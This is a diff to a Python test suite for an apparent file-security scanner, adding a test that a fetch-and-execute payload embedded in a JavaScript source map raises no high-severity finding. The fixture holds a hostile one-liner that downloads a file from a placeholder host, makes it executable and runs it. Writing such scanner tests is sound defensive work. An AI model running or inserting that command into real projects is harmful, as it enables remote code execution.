@@ -198,3 +198,20 @@ class TestActivationRunsUnasked:
         raw = json.dumps({"name": "app", "main": "index.js"}).encode()
         units = [FileUnit(FileContent(path="package.json", raw=raw, size=len(raw)))]
         assert Engine._extension_entries(units) == set()
+
+
+class TestSourceMapsAreNeverRun:
+    def test_a_download_and_run_in_a_source_map_does_not_block(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        source = "exec('wget -q https://example.invalid/x -o /tmp/x && chmod +x /tmp/x && /tmp/x')"
+        sourcemap = (
+            '{"version":3,"sources":["../src/a.ts"],"sourcesContent":['
+            + repr(source).replace("'", '"')
+            + "]}"
+        )
+        (tmp_path / "dist").mkdir()
+        (tmp_path / "dist" / "a.js.map").write_text(sourcemap, encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        assert not [f for f in result.findings if f.severity.name in ("HIGH", "CRITICAL")]
